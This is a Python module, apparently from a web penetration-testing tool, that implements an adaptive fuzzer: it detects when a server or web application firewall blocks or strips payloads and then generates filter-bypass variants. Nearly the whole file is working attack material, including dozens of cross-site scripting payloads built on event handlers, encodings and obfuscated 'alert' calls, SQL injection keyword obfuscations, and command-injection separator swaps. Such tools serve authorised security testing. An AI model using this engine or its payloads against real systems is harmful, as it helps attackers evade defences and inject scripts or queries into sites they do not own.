"""
Adaptive fuzzing engine -- mutates payloads based on server responses.

When a server blocks or filters a payload, the fuzzer automatically:
1. Detects what was filtered (specific characters, keywords, patterns)
2. Generates alternative payloads that bypass the filter
3. Escalates evasion techniques progressively
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field

from .payload_engine import PayloadEngine


@dataclass
class FuzzResult:
    """Result of a fuzzing attempt."""

    payload: str
    was_reflected: bool = False
    was_blocked: bool = False
    was_filtered: bool = False  # Payload was partially stripped
    filtered_chars: list[str] = field(default_factory=list)
    filtered_keywords: list[str] = field(default_factory=list)
    response_code: int = 200
    response_length: int = 0


class AdaptiveFuzzer:
    """Mutates payloads based on observed server behavior."""

    def __init__(self) -> None:
        self.blocked_patterns: list[str] = []
        self.filtered_chars: set[str] = set()
        self.filtered_keywords: set[str] = set()
        self.successful_evasions: list[str] = []
        self.evasion_level: int = 0
        self._attempt_count: int = 0

    # ------------------------------------------------------------------
    # Response analysis
    # ------------------------------------------------------------------
    def analyze_response(
        self,
        original_payload: str,
        response_body: str,
        response_code: int,
    ) -> FuzzResult:
        """Analyze how the server handled the payload."""
        self._attempt_count += 1
        result = FuzzResult(
            payload=original_payload,
            response_code=response_code,
            response_length=len(response_body),
        )

        # --- Blocked detection ---
        if response_code in (403, 406, 429, 503):
            result.was_blocked = True
            self.blocked_patterns.append(original_payload)
            return result

        body_lower = response_body.lower()
        block_indicators = [
            "blocked", "forbidden", "access denied",
            "request rejected", "web application firewall",
        ]
        for indicator in block_indicators:
            if indicator in body_lower:
                result.was_blocked = True
                self.blocked_patterns.append(original_payload)
                return result

        # --- Reflection detection ---
        if original_payload in response_body:
            result.was_reflected = True
            return result

        # --- Filter detection ---
        # Check if specific characters were stripped
        test_chars = ["<", ">", "'", '"', "(", ")", ";", "&", "|", "`"]
        for ch in test_chars:
            if ch in original_payload and ch not in response_body:
                result.filtered_chars.append(ch)
                self.filtered_chars.add(ch)

        # Check if keywords were stripped
        keywords = ["script", "alert", "onerror", "onload", "select",
                     "union", "eval", "javascript", "src", "href"]
        for kw in keywords:
            if kw.lower() in original_payload.lower():
                # Check both original case and lowercase
                if kw.lower() not in body_lower:
                    result.filtered_keywords.append(kw)
                    self.filtered_keywords.add(kw)

        if result.filtered_chars or result.filtered_keywords:
            result.was_filtered = True
        else:
            # Payload was not fully reflected but no specific filtering detected --
            # partial reflection or completely absent
            payload_lower = original_payload.lower()
            if any(fragment in body_lower for fragment in _split_fragments(payload_lower)):
                result.was_filtered = True

        return result

    # ------------------------------------------------------------------
    # Bypass generation
    # ------------------------------------------------------------------
    def generate_bypass(
        self, original_payload: str, fuzz_result: FuzzResult
    ) -> list[str]:
        """Generate alternative payloads that bypass detected filters."""
        bypasses: list[str] = []

        # ---- Character-level bypasses ----
        filtered = set(fuzz_result.filtered_chars)

        if "<" in filtered or ">" in filtered:
            # Angle brackets filtered: use event handlers without new tags
            bypasses.append('" onfocus=alert(1) autofocus="')
            bypasses.append("' onfocus=alert(1) autofocus='")
            bypasses.append("javascript:alert(1)")
            # Encoding bypasses
            bypasses.append("%3Cscript%3Ealert(1)%3C/script%3E")
            bypasses.append("&#60;script&#62;alert(1)&#60;/script&#62;")
            bypasses.append("\\u003cscript\\u003ealert(1)\\u003c/script\\u003e")

        if "'" in filtered and '"' not in filtered:
            # Single quotes filtered: use double quotes
            bypasses.append('" onfocus=alert(1) autofocus="')
            bypasses.append(original_payload.replace("'", '"'))

        if '"' in filtered and "'" not in filtered:
            # Double quotes filtered: use single quotes
            bypasses.append("' onfocus=alert(1) autofocus='")
            bypasses.append(original_payload.replace('"', "'"))

        if "'" in filtered and '"' in filtered:
            # Both quote types filtered: use backticks or no quotes
            bypasses.append("` onfocus=alert(1) autofocus=`")
            bypasses.append("<img src=x onerror=alert(1)>")
            bypasses.append("<svg onload=alert(1)>")

        if "(" in filtered or ")" in filtered:
            # Parentheses filtered: use alternatives
            bypasses.append("<img src=x onerror=alert`1`>")
            bypasses.append("<svg onload=alert`1`>")
            bypasses.append("<img src=x onerror=throw 1>")
            bypasses.append("<img src=x onerror=location='javascript:alert%281%29'>")

        if ";" in filtered:
            # Semicolons filtered (SQL/command injection)
            bypasses.append(original_payload.replace(";", "%0a"))  # newline
            bypasses.append(original_payload.replace(";", "||"))

        if "|" in filtered:
            bypasses.append(original_payload.replace("|", "%0a"))
            bypasses.append(original_payload.replace("|", ";"))

        # ---- Keyword-level bypasses ----
        kw_filtered = set(fuzz_result.filtered_keywords)

        if "script" in kw_filtered:
            # 'script' keyword filtered: use alternative tags
            bypasses.append("<img src=x onerror=alert(1)>")
            bypasses.append("<svg/onload=alert(1)>")
            bypasses.append("<details/open/ontoggle=alert(1)>")
            bypasses.append("<body onload=alert(1)>")
            bypasses.append("<input onfocus=alert(1) autofocus>")
            bypasses.append("<marquee onstart=alert(1)>")

        if "alert" in kw_filtered:
            # 'alert' keyword filtered: use alternatives
            bypasses.append(original_payload.replace("alert", "confirm"))
            bypasses.append(original_payload.replace("alert", "prompt"))
            bypasses.append(original_payload.replace("alert(1)",
                                                     "top['al'+'ert'](1)"))
            bypasses.append(original_payload.replace("alert(1)",
                                                     "window['al'+'ert'](1)"))
            bypasses.append(original_payload.replace("alert(1)",
                                                     "self[atob('YWxlcnQ=')](1)"))

        if "onerror" in kw_filtered:
            bypasses.append(original_payload.replace("onerror", "onload"))
            bypasses.append(original_payload.replace("onerror", "onfocus"))
            bypasses.append(original_payload.replace("onerror", "ontoggle"))

        if "select" in kw_filtered:
            bypasses.append(original_payload.replace("SELECT", "SE/**/LECT"))
            bypasses.append(original_payload.replace("SELECT", "SeLeCt"))
            bypasses.append(original_payload.replace("SELECT", "/*!50000SELECT*/"))

        if "union" in kw_filtered:
            bypasses.append(original_payload.replace("UNION", "UN/**/ION"))
            bypasses.append(original_payload.replace("UNION", "UnIoN"))
            bypasses.append(original_payload.replace("UNION", "/*!50000UNION*/"))

        # ---- Evasion-level mutations ----
        mutations = PayloadEngine.mutate_payload(
            original_payload, evasion_level=self.evasion_level
        )
        bypasses.extend(mutations)

        # ---- Re-use successful evasions ----
        if self.successful_evasions:
            # If we've found working evasion patterns before, try
            # applying the same transformations to this payload
            for prev_evasion in self.successful_evasions[-3:]:
                # If a previous evasion used encoding, encode this too
                if "%3C" in prev_evasion:
                    bypasses.append(
                        original_payload.replace("<", "%3C").replace(">", "%3E")
                    )
                if "/**/" in prev_evasion:
                    # Try inline comment insertion
                    for kw in ["UNION", "SELECT", "AND", "OR"]:
                        if kw in original_payload.upper():
                            idx = original_payload.upper().find(kw)
                            word = original_payload[idx:idx + len(kw)]
                            mid = len(word) // 2
                            bypasses.append(
                                original_payload[:idx]
                                + word[:mid] + "/**/" + word[mid:]
                                + original_payload[idx + len(kw):]
                            )
                            break

        # Deduplicate while preserving order
        seen: set[str] = set()
        unique: list[str] = []
        for bp in bypasses:
            if bp not in seen and bp != original_payload:
                seen.add(bp)
                unique.append(bp)
        return unique

    # ------------------------------------------------------------------
    # Evasion escalation
    # ------------------------------------------------------------------
    def escalate_evasion(self) -> None:
        """Increase evasion complexity after failed attempts."""
        self.evasion_level = min(self.evasion_level + 1, 3)

    def record_success(self, payload: str) -> None:
        """Record a payload that successfully bypassed filters."""
        if payload not in self.successful_evasions:
            self.successful_evasions.append(payload)

    def get_stats(self) -> dict:
        """Return fuzzer statistics."""
        return {
            "attempts": self._attempt_count,
            "evasion_level": self.evasion_level,
            "filtered_chars": sorted(self.filtered_chars),
            "filtered_keywords": sorted(self.filtered_keywords),
            "blocked_count": len(self.blocked_patterns),
            "successful_evasions": len(self.successful_evasions),
        }


# ----------------------------------------------------------------------
# Helpers
# ----------------------------------------------------------------------

def _split_fragments(payload: str, min_len: int = 4) -> list[str]:
    """Split a payload into meaningful fragments for partial-reflection checks."""
    # Split on common delimiters
    parts = re.split(r"[<>\"'();/\\&|`\s]+", payload)
    return [p for p in parts if len(p) >= min_len]
